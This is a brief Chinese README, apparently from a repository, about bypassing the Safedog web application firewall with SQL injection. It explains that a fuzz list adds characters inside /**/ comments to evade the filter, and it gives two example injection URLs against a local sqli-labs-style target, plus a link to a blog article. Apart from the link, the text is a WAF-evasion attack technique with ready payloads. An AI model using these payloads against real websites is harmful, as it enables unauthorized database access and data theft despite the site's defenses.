# bypass
安全狗bypass

sqlifuzz.txt 文件内容
主要是在注释符/**/ 中添加其他字符，用来绕过安全狗waf

使用 
```
http://192.168.0.101/Less-1/?id=1' and/*/!/%%%*/1=1 -- - 
http://192.168.0.101/Less-1/?id=1' and/*/!/%%%*/1=2 -- -
```
文章：

```
https://blog.csdn.net/qq_18193739/article/details/131993808
```
